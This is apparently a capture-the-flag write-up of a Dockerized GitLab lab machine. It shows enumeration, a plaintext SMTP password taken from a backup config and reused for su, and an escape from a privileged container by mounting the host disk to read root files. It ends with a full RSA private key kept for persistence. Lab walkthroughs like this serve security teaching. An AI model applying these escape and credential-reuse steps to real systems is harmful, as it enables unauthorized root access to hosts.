## >>Enumeration-
### We inside a Docker container-
```bash
git@gitlab:~/gitlab-rails/working$ ls -la /
total 104
drwxr-xr-x   1 root root 4096 Dec  1 12:41 .
drwxr-xr-x   1 root root 4096 Dec  1 12:41 ..
-rwxr-xr-x   1 root root    0 Dec  1 12:41 .dockerenv
-rw-r--r--   1 root root  185 Nov 20  2018 RELEASE
drwxr-xr-x   2 root root 4096 Nov 20  2018 assets
drwxr-xr-x   1 root root 4096 Dec  1 15:40 bin
drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
drwxr-xr-x  13 root root 3760 May 16 13:10 dev
drwxr-xr-x   1 root root 4096 Dec  2 10:45 etc
drwxr-xr-x   1 root root 4096 Dec  2 10:45 home
```

### Reading User flag-

```bash
git@gitlab:~/gitlab-rails/working$ cd /home
git@gitlab:/home$ ls -la
total 12
drwxr-xr-x 1 root root 4096 Dec  2 10:45 .
drwxr-xr-x 1 root root 4096 Dec  1 12:41 ..
drwxr-xr-x 2 dude dude 4096 Dec  7 16:58 dude
git@gitlab:/home$ cd dude/
git@gitlab:/home/dude$ ls -la
total 24
drwxr-xr-x 2 dude dude 4096 Dec  7 16:58 .
drwxr-xr-x 1 root root 4096 Dec  2 10:45 ..
lrwxrwxrwx 1 root root    9 Dec  7 16:58 .bash_history -> /dev/null
-rw-r--r-- 1 dude dude  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 dude dude 3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 dude dude  655 May 16  2017 .profile
-r--r----- 1 dude git    33 Dec  2 10:46 user.txt
git@gitlab:/home/dude$ cat user.txt 
e1e30b052b6ec0670698805d745e7682
```

### Found backup file -

```bash
git@gitlab:/home/dude$ cd /opt
git@gitlab:/opt$ ls
backup  gitlab
git@gitlab:/opt$ cd backup/
git@gitlab:/opt/backup$ ls -la
total 112
drwxr-xr-x 2 root root  4096 Dec  7 09:25 .
drwxr-xr-x 1 root root  4096 Dec  1 16:23 ..
-rw-r--r-- 1 root root   872 Dec  7 09:25 docker-compose.yml
-rw-r--r-- 1 root root 15092 Dec  1 16:23 gitlab-secrets.json
-rw-r--r-- 1 root root 79639 Dec  1 19:20 gitlab.rb
```

### Docker-compose.yml-

#### privileged: true
```bash
git@gitlab:/opt/backup$ cat docker-compose.yml 
version: '2.4'

services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
    networks:
      gitlab:
        ipv4_address: 172.19.0.2
    ports:
      - '5080:80'
      #- '127.0.0.1:5080:80'
      #- '127.0.0.1:50443:443'
      #- '127.0.0.1:5022:22'
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m

networks:
  gitlab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.19.0.0/16
```

### gitlab.rb-

#### Found a password : gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"

```bash
git@gitlab:/opt/backup$ cat gitlab.rb | grep pass
#### Email account password
# gitlab_rails['incoming_email_password'] = "[REDACTED]"
#     password: '_the_password_of_the_bind_user'
#     password: '_the_password_of_the_bind_user'
#   '/users/password',
#### Change the initial default admin password and shared runner registration tokens.
# gitlab_rails['initial_root_password'] = "password"
# gitlab_rails['db_password'] = nil
# gitlab_rails['redis_password'] = nil
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
# gitlab_shell['http_settings'] = { user: 'username', password: 'password', ca_file: '/etc/ssl/cert.pem', ca_path: '/etc/pki/tls/certs', self_signed_cert: false}
##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab`
# postgresql['sql_user_password'] = 'SQL_USER_PASSWORD_HASH'
# postgresql['sql_replication_password'] = "md5 hash of postgresql password" # You can generate with `gitlab-ctl pg-password-md5 <dbuser>`
# redis['password'] = 'redis-password-goes-here'
####! **Master password should have the same value defined in
####!   redis['password'] to enable the instance to transition to/from
# redis['master_password'] = 'redis-password-goes-here'
# geo_secondary['db_password'] = nil
# geo_postgresql['pgbouncer_user_password'] = nil
#     password: PASSWORD
###! generate this with `echo -n '$password + $username' | md5sum`
# pgbouncer['auth_query'] = 'SELECT username, password FROM public.pg_shadow_lookup($1)'
#     password: MD5_PASSWORD_HASH
# postgresql['pgbouncer_user_password'] = nil
```

## Tried the password with container root -

```bash
git@gitlab:/opt/backup$ su -                                              
Password: 
root@gitlab:~# 
```

# Exploiting `privileged: true` to get system root-

### privileged:true--->this means that the container has root privileges on the host and we can use this to mount the host file system.

### >>sda2 looks like the main disk-

```bash
root@gitlab:~# lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop1    7:1    0 55.5M  1 loop 
loop4    7:4    0 31.1M  1 loop 
loop2    7:2    0 71.4M  1 loop 
loop0    7:0    0 55.4M  1 loop 
sda      8:0    0   20G  0 disk 
|-sda2   8:2    0   18G  0 part /var/opt/gitlab
|-sda3   8:3    0    2G  0 part [SWAP]
`-sda1   8:1    0    1M  0 part 
loop5    7:5    0 31.1M  1 loop 
loop3    7:3    0 71.3M  1 loop
```

## Mounting the system-

```bash
mount /dev/sda2 /mnt
root@gitlab:/# ls /mnt/
bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
root@gitlab:/mnt# cd root/
root@gitlab:/mnt/root# ls -la
total 60
drwx------ 10 root root 4096 Dec  7 17:02 .
drwxr-xr-x 20 root root 4096 Dec  7 17:44 ..
lrwxrwxrwx  1 root root    9 Jul 11  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 May  7  2020 .cache
drwx------  3 root root 4096 Jul 11  2020 .config
-rw-r--r--  1 root root   44 Jul  8  2020 .gitconfig
drwxr-xr-x  3 root root 4096 May  7  2020 .local
lrwxrwxrwx  1 root root    9 Dec  7 17:02 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   75 Jul 12  2020 .selected_editor
drwx------  2 root root 4096 Dec  7 16:49 .ssh
drwxr-xr-x  2 root root 4096 Dec  1 12:28 .vim
lrwxrwxrwx  1 root root    9 Dec  7 17:02 .viminfo -> /dev/null
drwxr-xr-x  3 root root 4096 Dec  1 12:41 docker-gitlab
drwxr-xr-x 10 root root 4096 Jul  9  2020 ready-channel
-r--------  1 root root   33 Jul  8  2020 root.txt
drwxr-xr-x  3 root root 4096 May 18  2020 snap
root@gitlab:/mnt/root# cat root.txt 
b7f98681505cd39066f67147b103c2b3
```

## ssh key for persistance-

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf
YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX
TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W
rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011
YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof
Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf
iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+
lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab
VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu
K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL
g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2
3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy
n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8
kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1
KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff
Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B
MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab
dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v
DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa
bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r
ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv
aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz
vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
-----END RSA PRIVATE KEY-----
```



PAWNED!!!